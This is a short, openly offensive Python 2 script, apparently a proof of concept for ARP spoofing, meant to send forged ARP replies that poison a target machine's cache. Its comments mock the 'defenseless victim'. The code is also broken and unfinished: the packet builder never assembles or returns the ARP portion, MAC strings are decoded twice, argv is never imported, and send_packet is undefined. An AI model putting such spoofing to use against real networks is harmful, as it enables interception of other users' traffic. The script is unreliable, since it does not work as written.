#!/usr/bin/python
import socket
import struct
import sys
import socket

# This code sends an ARP packet using the interface wlo2
# The idea is to create spoof ARP packets and verify that this PoC works 

def create_ARP_pack(target_mac, target_ip, spoof_mac, spoof_ip):
  # Adding data to the Packet (this is the ethernet portion 
  # The Ethernet header contains Destination MAC (6 bytes), Source MAC (6 bytes) and Ethernet type (2 bytes)
  # To "create" the MAC addresses; from 'aabbccddeeff' we will use .decode('hex') result is: \xaa\xbb\xcc\xdd\xee\xff
  target_mac = target_mac.decode('hex')
  spoof_mac = spoof_mac.decode('hex') 
  eth_type = '0800'
  ethernet_type = eth_type.decode('hex')
  packet = struct.pack('>6s6s2s', target_mac, spoof_mac, ethernet_type)

  ####  ARP Section  ###
  # Hardware Type: Ethernet
  HW_Type = '0x0001'
  # Protocol type IPv4
  Pro_Type = '0x0800'
  # Hardware Address Length: Specifies how long hardware addresses are in this message. 
  # For Ethernet or other networks using IEEE 802 MAC addresses, the value is 6.
  HLN = 6
  # Protocol Address Length: Again, the complement of the preceding field; specifies how long protocol 
  # (layer three) addresses are in this message. For IP(v4) addresses this value is of course 4.
  PLN = 4
  # OPCode Specifies the Nature of the ARP message being sent. First 2 values are used for regular ARP
  # ARP Request -> 0x0001 ; ARP Reply -> 0x0002
  OPCode = 0x0002
  # Sender's MAC Address which is our malicious Spoofer
  spoof_mac = spoof_mac.decode('hex')
  # Sender IP Address
  s_ip_bits = socket.inet_aton(spoof_ip)
  # Receiver MAC Address, which is our poor victim
  target_mac = target_mac.decode('hex')
  # Destination IP Address
  d_ip_bits = socket.inet_aton(target_ip)


  
def main():
  args = argv[1:]
  if len(args) < 4 :
    print 'Usage: Spoof_ARP.py Target_MAC_Addr Target_IP_Addr Spoof_MAC_Addr Spoof_IP_Addr'
    print 'The MAC addresses must be in the format aabbccddeeff. The IP Addresses must be in the format: 192.168.1.2'
    print 'This program does an ARP spoof By sending an ARP packet to the Target Machine containing the Spoof data'
  else:
    # Ordering the received arguments into their corresponding variables
    target_mac = args[ 0]
    target_ip = args[1]
    spoof_mac = args[2]
    spoof_ip = args[3]
    # Creating the ARP packet (and the underlying Ethernet packet too)
    packet = create_ARP_pack(target_mac, target_ip, spoof_mac, spoof_ip)
    # Sending the packet to our defenseless victim !! muajajajajaja 
    send_packet(packet)

if __name__ == '__main__':
  main()
